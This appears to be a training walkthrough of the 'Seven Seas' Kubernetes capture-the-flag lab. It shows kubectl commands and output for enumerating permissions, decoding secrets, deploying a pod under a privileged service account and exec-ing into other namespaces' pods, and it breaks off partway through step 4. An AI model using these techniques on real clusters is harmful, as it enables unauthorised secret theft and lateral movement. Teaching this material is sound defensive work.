# Scenario: Seven Seas

- [Learning Outcomes](#learning-outcomes)
- [Challenge Description](#challenge-description)
- [Guided Walkthrough](#guided-walkthrough)
  - [Step 1: Enumerating internal and external resources](#step-1-enumerating-internal-and-external-resources)
  - [Step 2: Accessing secrets and obtaining the second piece of the map](#step-2-accessing-secrets-and-obtaining-the-second-piece-of-the-map)
  - [Step 3: Deploying a pod in the South-Atlantic and accessing a sidecar container](#step-3-deploying-a-pod-in-the-south-atlantic-and-accessing-a-sidecar-container)
  - [Step 4: Access the whydah-galley pod and discover the fourth piece of the map](#step-4-access-the-whydah-galley-pod-and-discover-the-fourth-piece-of-the-map)
  - [Step 5: Enumerating the Indian Ocean and modifing the network policy](#step-5-enumerating-the-indian-ocean-and-modifing-the-network-policy)
  - [Step 6: Exploiting the crack-in-hull service and obtaining the fifth piece of the map](#step-6-exploiting-the-crack-in-hull-service-and-obtaining-the-fifth-piece-of-the-map)
  - [Step 7: Using a deployment in the South Pacific and adhering to Pod Security Standards](#step-7-using-a-deployment-in-the-south-pacific-and-adhering-to-pod-security-standards)
  - [Step 8: Obtaining the sixth piece of the map and ssh into the Royal Fortune](#step-8-obtaining-the-sixth-piece-of-the-map-and-ssh-into-the-royal-fortune)
  - [Step 9: Escaping the Royal Fortune and obtaining the last flag](#step-9-escaping-the-royal-fortune-and-obtaining-the-last-flag)
- [Remediation and Security Considerations](#remediation-and-security-considerations)

## Learning Outcomes

The purpose of Seven Seas is to teach participants about the fundamentals of Kubernetes and containers. This includes:

1. Understanding how to enumerate a Kubernetes cluster and using kubectl
2. Learn more about different Kubernetes resources and how they can be abused
3. Different security controls and how they can be applied to restrict access
4. The importance of restricting the permissions to running containers

## Challenge Description

```
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣄⣠⣀⡀⣀⣠⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⢠⣠⣼⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⢠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣟⣾⣿⣽⣿⣿⣅⠈⠉⠻⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⢀⡶⠒⢉⡀⢠⣤⣶⣶⣿⣷⣆⣀⡀⠀⢲⣖⠒⠀⠀⠀⠀⠀⠀⠀
⢀⣤⣾⣶⣦⣤⣤⣶⣿⣿⣿⣿⣿⣿⣽⡿⠻⣷⣀⠀⢻⣿⣿⣿⡿⠟⠀⠀⠀⠀⠀⠀⣤⣶⣶⣤⣀⣀⣬⣷⣦⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣦⣼⣀⠀
⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠓⣿⣿⠟⠁⠘⣿⡟⠁⠀⠘⠛⠁⠀⠀⢠⣾⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⠙⠁
⠀⠸⠟⠋⠀⠈⠙⣿⣿⣿⣿⣿⣿⣷⣦⡄⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⣼⣆⢘⣿⣯⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠉⢱⡿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡿⠦⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡗⠀⠈⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣉⣿⡿⢿⢷⣾⣾⣿⣞⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⠿⠿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣾⣿⣿⣷⣦⣶⣦⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣤⡖⠛⠶⠤⡀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠙⣿⣿⠿⢻⣿⣿⡿⠋⢩⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠧⣤⣦⣤⣄⡀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠘⣧⠀⠈⣹⡻⠇⢀⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠈⢽⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣴⣿⣷⢲⣦⣤⡀⢀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣷⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠂⠛⣆⣤⡜⣟⠋⠙⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⠉⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⣆⠀⠰⠄⠀⠉⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⠿⠿⣿⣿⣿⠇⠀⠀⢀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡇⠀⠀⢀⣼⠗⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

Captain Hλ$ħ𝔍Ⱥ¢k previously navigated the Seven Seas to locate the fabled pirate ship the "Royal Fortune".

Located deep within the ship is wondrous treasure but to access it you will need to find all the missing map pieces.

Time to set sail and use your knowledge of Kubernetes and Containers to master all the oceans.
```

## Guided Walkthrough

### Step 1: Enumerating internal and external resources

The first step is to enumerate resources we have access to from our initial starting point. We'll start by enumerating internal resources and can see that we have the user `swashbyter` on a host called `fancy`. If we look at the `/home` directory for the user we discover a couple of files.

```bash
swashbyter@fancy:~$ ls -la
total 32
drwxr-xr-x 1 swashbyter swashbyter 4096 Aug 23 08:01 .
drwxr-xr-x 1 root       root       4096 Aug 23 07:55 ..
-rw-r--r-- 1 swashbyter swashbyter  220 Aug  5 14:57 .bash_logout
-rw-r--r-- 1 swashbyter swashbyter 3526 Aug  5 14:57 .bashrc
-rw-r--r-- 1 swashbyter swashbyter  807 Aug  5 14:57 .profile
-rw-rw---- 1 swashbyter swashbyter  800 Aug 18 13:58 diary.md
-rw-rw---- 1 swashbyter swashbyter  624 Aug 18 13:58 treasure-map-1
-rw-rw---- 1 swashbyter swashbyter  587 Aug 18 13:58 treasure-map-7
```

The `diary.md` file contains a couple of entries that are interesting. The first is a reference to a treasure map which we have access to `treasure-map-1` and `treasure-map-7` but need to find the remaining pieces by "sailing the seven seas". The pieces of the treasure-map seem to be a ssh key which when complete will allow us to ssh into the Royal Fortune.

The second reference is to the "Path of the Pirate" which shows the way to follow to find each piece of the map. We can view the "Path of the Pirate" by the following command and viewing it on `localhost:8080`

```bash
ssh -F cp_simulator_config -L 8080:localhost:8080 -N bastion
```

![Path of the Pirate](./images/path-of-the-pirate.png)

From this we can see we need to travel from the Arctic Ocean to North Pacific Ocean, navigating through different seas to find the remaining pieces of the map. So we've found local user files, let's look for some other files which we can use. Using `env` we can see that we are in Kubernetes cluster and likely to be in a container.

```bash
swashbyter@fancy:~$ env
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
THE_WAY_SERVICE_PORT=80
HOSTNAME=fancy
THE_WAY_PORT=tcp://10.98.238.103:80
THE_WAY_PORT_80_TCP=tcp://10.98.238.103:80
PWD=/home/swashbyter
THE_WAY_PORT_80_TCP_ADDR=10.98.238.103
HOME=/home/swashbyter
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.swp=00;90:*.tmp=00;90:*.dpkg-dist=00;90:*.dpkg-old=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:
TERM=xterm
SHLVL=1
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
THE_WAY_PORT_80_TCP_PORT=80
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
THE_WAY_PORT_80_TCP_PROTO=tcp
THE_WAY_SERVICE_HOST=10.98.238.103
OLDPWD=/
_=/usr/bin/env
```

As we are in a container in a Kubernetes cluster, we can look at our service account token and see what permissions it has. The service account token is located in standard location which is `/var/run/secrets/kubernetes.io/serviceaccount/`.

```bash
swashbyter@fancy:~$ ls -al /var/run/secrets/kubernetes.io/serviceaccount/
total 4
drwxrwxrwt 3 root root  140 Nov 20 11:36 .
drwxr-xr-x 3 root root 4096 Nov 20 10:00 ..
drwxr-xr-x 2 root root  100 Nov 20 11:36 ..2023_11_20_11_36_52.676137219
lrwxrwxrwx 1 root root   31 Nov 20 11:36 ..data -> ..2023_11_20_11_36_52.676137219
lrwxrwxrwx 1 root root   13 Nov 20 09:59 ca.crt -> ..data/ca.crt
lrwxrwxrwx 1 root root   16 Nov 20 09:59 namespace -> ..data/namespace
lrwxrwxrwx 1 root root   12 Nov 20 09:59 token -> ..data/token
```

If we have `kubectl` installed the binary will use token specified in this directory for authentication.

```bash
swashbyter@fancy:~$ which kubectl
/usr/bin/kubectl
```

Excellent. Let's use `auth can-i` to see what permissions we have.

```bash
swashbyter@fancy:~$ kubectl auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
namespaces                                      []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

The only noticeable permission we have is the ability to list namespaces. Let's see what namespaces we have access to.

```bash
swashbyter@fancy:~$ kubectl get namespaces
NAME              STATUS   AGE
arctic            Active   122m
default           Active   123m
indian            Active   122m
kube-node-lease   Active   123m
kube-public       Active   123m
kube-system       Active   123m
kyverno           Active   122m
north-atlantic    Active   122m
north-pacific     Active   122m
south-atlantic    Active   122m
south-pacific     Active   122m
southern          Active   122m
```

We can see that we have access to a number of namespaces but signficantly we can see the "Seven Seas" specified as namespaces. Let's see what resources we have access to in the arctic namespace.

```bash
swashbyter@fancy:~$ kubectl auth can-i --list -n arctic
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
namespaces                                      []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

This looks the same permissions we have in the default namespace, if we see access to namespaces specified for another namespace, it is good chance we have cluster wide permissions to `get` and `list`. There is nothing special, so let's start where the "Path-of-the-Pirate" specifies, the North Atlantic Ocean.

```bash
swashbyter@fancy:~$ kubectl auth can-i --list -n north-atlantic
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
namespaces                                      []                                    []               [get list]
secrets                                         []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

This time we can see we have permissions to `get` and `list` secrets in the `north-atlantic` namespace.

### Step 2: Accessing secrets and obtaining the second piece of the map

We can access the secret by the following command:

```bash
swashbyter@fancy:~$ kubectl get secrets -n north-atlantic
NAME             TYPE     DATA   AGE
treasure-map-2   Opaque   1      178m
```

Kubernetes secrets are stored as base64 encoded strings. We access the content of the secret by outputting to `json` or `yaml` format.

```bash
swashbyter@fancy:~$ kubectl get secrets treasure-map-2 -n north-atlantic -oyaml
apiVersion: v1
data:
  treasure-map-2: VHlSWU1OMzRaSkEvSDlBTk4wQkZHVTFjSXNvSFYwWGpzanVSZi83V0duY2tWY1lBcTNMbzBCL0ZaVFFGWm41Tk1OenE5UQplejdvZ1RyMmNLalNXNVh5VlBsdmdnc0Q5dHJ4ZkFoOSttNEN3cWpBMWN0c1RBVG1pQUZxVzJxNU1KSG51bXNrSGZBUzFvCkY5RWF3ZEExNkJQRFF3U3Rma2pkYS9rQjNyQWhDNWUrYlFJcUZydkFpeFUramh3c2RRVS9MVitpWjZYUmJybjBUL20wZTQKUytGT2t6bDhUTkZkOTFuK01BRFd3dktzTmd6TXFWZkwwL1NXRGlzaXM0U2g1NFpkYXB0VVM2MG5rTUlnWDNzUDY1VUZYRQpESWpVSjkzY1F2ZkxZMFc0ZWVIcllhYzJTWjRqOEtlU0g4d2ZsVFVveTg4T2NGbDdmM0pQM29KMU1WVkZWckg4TDZpTlNMCmNBQUFkSXp5cWlVczhxb2xJQUFBQUhjM05vTFhKellRQUFBZ0VBc05vd1A4amxGZUIrUUEzTGY1bkREa3pBODA5OW9PTzIKOGU3bEdlVHNrNjFtRGpRa3JIc1FneGt4YjBRcEJVTW9leGl2Y3BLWGt3bStuU0x4YmpVbjVJVzhURlloL3lneWtXOFViTQ==
kind: Secret
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","data":{"treasure-map-2":"VHlSWU1OMzRaSkEvSDlBTk4wQkZHVTFjSXNvSFYwWGpzanVSZi83V0duY2tWY1lBcTNMbzBCL0ZaVFFGWm41Tk1OenE5UQplejdvZ1RyMmNLalNXNVh5VlBsdmdnc0Q5dHJ4ZkFoOSttNEN3cWpBMWN0c1RBVG1pQUZxVzJxNU1KSG51bXNrSGZBUzFvCkY5RWF3ZEExNkJQRFF3U3Rma2pkYS9rQjNyQWhDNWUrYlFJcUZydkFpeFUramh3c2RRVS9MVitpWjZYUmJybjBUL20wZTQKUytGT2t6bDhUTkZkOTFuK01BRFd3dktzTmd6TXFWZkwwL1NXRGlzaXM0U2g1NFpkYXB0VVM2MG5rTUlnWDNzUDY1VUZYRQpESWpVSjkzY1F2ZkxZMFc0ZWVIcllhYzJTWjRqOEtlU0g4d2ZsVFVveTg4T2NGbDdmM0pQM29KMU1WVkZWckg4TDZpTlNMCmNBQUFkSXp5cWlVczhxb2xJQUFBQUhjM05vTFhKellRQUFBZ0VBc05vd1A4amxGZUIrUUEzTGY1bkREa3pBODA5OW9PTzIKOGU3bEdlVHNrNjFtRGpRa3JIc1FneGt4YjBRcEJVTW9leGl2Y3BLWGt3bStuU0x4YmpVbjVJVzhURlloL3lneWtXOFViTQ=="},"kind":"Secret","metadata":{"annotations":{},"name":"treasure-map-2","namespace":"north-atlantic"},"type":"Opaque"}
  creationTimestamp: "2023-11-20T09:59:53Z"
  name: treasure-map-2
  namespace: north-atlantic
  resourceVersion: "924"
  uid: e87e2cd0-a1d2-42dd-beb6-79dc34228d40
type: Opaque
```

If you know the data label for the secret, then a single command can be used to decode the secret.

```bash
swashbyter@fancy:~$ kubectl get secrets treasure-map-2 -n north-atlantic -ojson | jq -Mr '.data."treasure-map-2"' | base64 -d
TyRYMN34ZJA/H9ANN0BFGU1cIsoHV0XjsjuRf/7WGnckVcYAq3Lo0B/FZTQFZn5NMNzq9Q
ez7ogTr2cKjSW5XyVPlvggsD9trxfAh9+m4CwqjA1ctsTATmiAFqW2q5MJHnumskHfAS1o
F9EawdA16BPDQwStfkjda/kB3rAhC5e+bQIqFrvAixU+jhwsdQU/LV+iZ6XRbrn0T/m0e4
S+FOkzl8TNFd91n+MADWwvKsNgzMqVfL0/SWDisis4Sh54ZdaptUS60nkMIgX3sP65UFXE
DIjUJ93cQvfLY0W4eeHrYac2SZ4j8KeSH8wflTUoy88OcFl7f3JP3oJ1MVVFVrH8L6iNSL
cAAAdIzyqiUs8qolIAAAAHc3NoLXJzYQAAAgEAsNowP8jlFeB+QA3Lf5nDDkzA8099oOO2
8e7lGeTsk61mDjQkrHsQgxkxb0QpBUMoexivcpKXkwm+nSLxbjUn5IW8TFYh/ygykW8UbM
```

At this point, it is worth building the treasure map. It is recommended to do this off the instance in the event that the connection is terminated or if the pod is restarted.

```bash
# treasure_map_1
-----BEGIN OPENSSH PRIVATE KEY-----
b3Blbn...
# treasure_map_2
TyRYMN34ZJA...

# treasure_map_7
...TIyAQ==
-----END OPENSSH PRIVATE KEY-----
```

### Step 3: Deploying a pod in the South-Atlantic and accessing a sidecar container

With the North Atlantic conquered, we can turn our attention to the South Atlantic. Let's enumerate our permission in the `south-atlantic` namespace.

```bash
swashbyter@fancy:~$ kubectl auth can-i --list -n south-atlantic
Resources                                       Non-Resource URLs                     Resource Names   Verbs
pods/exec                                       []                                    []               [create delete get list patch update watch]
pods                                            []                                    []               [create delete get list patch update watch]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
namespaces                                      []                                    []               [get list]
serviceaccounts                                 []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

Three permissions are interesting here. Firstly, we have full permissions over `pods` and `pods/exec` which means we can create pods and execute commands in them. Secondly, we have permissions to `get` and `list` service accounts which is interesting as there potentially is a service account we want to use for our deployed pod. If we enumerate the service accounts within the namespace we can see that there is a service account called `the-way`.

```bash
swashbyter@fancy:~$ kubectl get serviceaccounts -n south-atlantic
NAME      SECRETS   AGE
default   0         3h24m
invader   0         3h24m
```

The invader service account seems interesting but without permissions to view roles and role-bindings it is hard to determine what it has access to. Let's deploy a pod in the `south-atlantic` namespace and see what we can do.

```bash
apiVersion: v1
kind: Pod
metadata:
  name: invader
  namespace: south-atlantic
spec:
  serviceAccountName: invader
  containers:
  - image: docker.io/controlplaneoffsec/kubectl:latest
    command: ["sleep", "2d"]
    name: tools
    imagePullPolicy: IfNotPresent
    securityContext:
      allowPrivilegeEscalation: false
```

We can apply the configuration via:

```bash
swashbyter@fancy:~$ kubectl apply -f pod.yaml
pod/invader created
```

If we view the running pod we notice something stange...

```bash
swashbyter@fancy:~$ kubectl get pods -n south-atlantic
NAME      READY   STATUS    RESTARTS   AGE
invader   2/2     Running   0          12s
```

We only specified one container but there is two containers running. Let's look at the pod specification to understand this a little bit better.

```bash
swashbyter@fancy:~$ kubectl get pods invader -n south-atlantic -oyaml
```

Highlighted below are interesting parts of the outputted specification:

1. We see there is annotation add sidecar container via Kyverno
2. We can see that sidecar container is called `blockade-ship`

```yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    ...
    policies.kyverno.io/last-applied-patches: |
      add-sidecar.add-sidecar.kyverno.io: added /spec/containers/0
spec:
  containers:
  - command:
    - sleep
    - 2d
    image: docker.io/controlplaneoffsec/seven-seas:blockade-ship
    imagePullPolicy: IfNotPresent
    name: blockade-ship
    ...
```

> Note: A sidecar container is used in this scenario to demostrate that Kyverno can be used to inject additional containers to a pod. The sidecar pattern is useful for applying a level of consistency to pods on admission such as specific labels or offloading encryption and decryption tasks.

Rather than `exec` into our newly created container, let's see if we can `exec` into the sidecar container.

```bash
swashbyter@fancy:~$ kubectl exec -c blockade-ship -it invader -n south-atlantic -- /bin/sh
/ #
```

Excellent we have local access to the `blockade-ship`. Enumerating the file system, one directory sticks out `contraband`. Within the directory we find our third piece of the map.

```bash
/contraband # cat treasure-map-3 | base64 -d
qnuLMQ+cRv2W0dxz8u2YjLn2yqDy8lHscr5QUoULSOEVTtp1BLDBIg+xI3TrycehuV9Qak
3WkmEn1WXQcdYKhMKDtOdo1XVWNNq7XumsDAavpgT2ykq+hp8ENIUzjgIfSa7fEhC3d2kF
B7WLMTPmA1RcO0/D3SdUZwkZ/1qlxn7c0L6doW/7REbp31JKOzHyurDrs/mFpi4QyhYsfI
aWtn1cKqSW5MumiWJi4bTyRYMN34ZJA/H9ANN0BFGU1cIsoHV0XjsjuRf/7WGnckVcYAq3
Lo0B/FZTQFZn5NMNzq9Qez7ogTr2cKjSW5XyVPlvggsD9trxfAh9+m4CwqjA1ctsTATmiA
FqW2q5MJHnumskHfAS1oF9EawdA16BPDQwStfkjda/kB3rAhC5e+bQIqFrvAixU+jhwsdQ
U/LV+iZ6XRbrn0T/m0e4S+FOkzl8TNFd91n+MADWwvKsNgzMqVfL0/SWDisis4Sh54Zdap
```

Now we've got the third piece of the map, let's `exec` into our original container and see what permissions the service account has, specifically in the `southern` namespace.

```bash
swashbyter@fancy:~$ kubectl exec -c tools -it invader -n south-atlantic -- /bin/bash
root@invader:~# kubectl auth can-i --list -n southern
Resources                                       Non-Resource URLs                     Resource Names   Verbs
pods/exec                                       []                                    []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

From the output of the command, the service account has permissions to `get` and `list` pods and `create` pods/exec. This combination allows us to spawn a new process in a container in a pod within the `southern` namespace.

If we enumerate pods within the `southern` namespace we can see that there is a pod called `whydah-galley`.

### Step 4: Access the whydah-galley pod and discover the fourth piece of the map

Let's run the `exec` command again and see if we can access the `whydah-galley` pod.

```bash
root@invader:~# kubectl exec -it whydah-galley -n southern -- /bin/bash
root@whydah-galley:/#
```

We are in! Enumerating the file system we find something interesting in the `/mnt` directory.

```bash
root@whydah-galley:/mnt# ls -la
total 12
